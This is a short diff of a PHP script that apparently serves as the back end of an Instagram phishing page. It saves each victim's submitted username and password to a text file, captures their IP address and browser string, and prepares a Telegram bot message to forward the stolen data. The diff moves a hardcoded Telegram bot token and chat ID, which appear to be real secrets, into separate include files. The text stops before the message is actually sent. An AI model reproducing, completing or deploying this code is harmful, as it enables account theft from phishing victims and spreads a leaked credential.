@@ -1,17 +1,18 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: new.php');
+header('Location: redirect.php');
 
 $username = $_POST['username'];
 $password = $_POST['password'];
 
-  
+
 $ip =$_SERVER['REMOTE_ADDR'];
 $browser = $_SERVER['HTTP_USER_AGENT'];
+include "chatid.php";
 
-$apiToken = "1521176747:AAFdv1Y68rZgpuViT-gHQrk54yyrJhh1PF4";
-$chat = "996470973";
+include "apitoken.php";
+
 $data = [
     'chat_id' => $chat,
     'text' => "⊚--------------------------------------------------------⊚
